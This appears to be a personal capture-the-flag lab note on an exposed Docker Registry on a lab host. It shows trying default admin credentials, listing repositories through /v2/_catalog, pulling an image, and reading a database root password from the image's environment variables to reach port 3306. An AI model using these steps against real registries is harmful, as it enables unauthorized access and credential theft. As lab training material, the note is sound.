Nmap called this Docker Registry (API: 2.0) -> This is a service you can host so people can pull and push images to the registry to work with them, and the entry point for the api is /v2/\<name\>

literaly just tried 

```bash
$ sudo docker login 10.10.196.61:5000
Username: admin
Password: admin

Had a bit of a hard time but found that the link

http://10.10.196.61:5000/v2/_catalog

gives me a list of all available:

|||
|---|---|
|repositories||
|0|"umbrella/timetracking"|

So let us try to see what is within this 

```bash
 sudo docker pull 10.10.196.61:5000/umbrella/timetracking
 sudo docker inspect image-id
```

And we obtain the following 

```txt
            "ExposedPorts": {
                "8080/tcp": {}
            },

            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NODE_VERSION=19.3.0",
                "YARN_VERSION=1.22.19",
                "DB_HOST=db",
                "DB_USER=root",
                "DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5",
                "DB_DATABASE=timetracking",
                "LOG_FILE=/logs/tt.log"
            ],
            "Cmd": [
                "/bin/sh",
                "-c",
                "#(nop) ",
                "CMD [\"node\" \"app.js\"]"

```

Now we can enter the database with credentials:
- root
- Ng1-f3!Pe7-e5?Nf3xe5

Let's continue in [[PORT 3306]]
